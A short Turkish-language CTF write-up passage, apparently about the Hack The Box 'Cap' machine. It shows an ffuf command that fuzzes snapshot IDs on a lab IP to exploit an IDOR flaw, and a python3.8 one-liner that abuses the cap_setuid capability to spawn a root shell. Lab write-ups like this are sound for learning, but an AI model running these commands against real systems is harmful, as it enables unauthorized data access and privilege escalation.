## IDOR?
`Security Snapshot` kısmında ise bizi şöyle bir url karşılıyor.

`http://10.129.91.27/data/1`

datanın sonundaki sayı muhtemelen snapshot numarasını veriyor. Bu yüzden fuff ile fuzz yapacağım.

#### Önerdiğim komut
```bash
seq 0 100 | ffuf -u http://10.129.91.27/data/FUZZ -w - -fs 208
```

ilginç bir şekilde 0 olarak kayda geçmiş bir snapshot var.

![alt text](/assets/img/cap/image-2.png)

## Privilege Escalation Denemesi
`cap_setuid` parametresi bize kullanıcı kimliği değiştirme yetkisi verir. Bu python binary'sinde varsa kolayca root olabiliriz.

bu komut ile beraber makinede root oluyoruz.
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
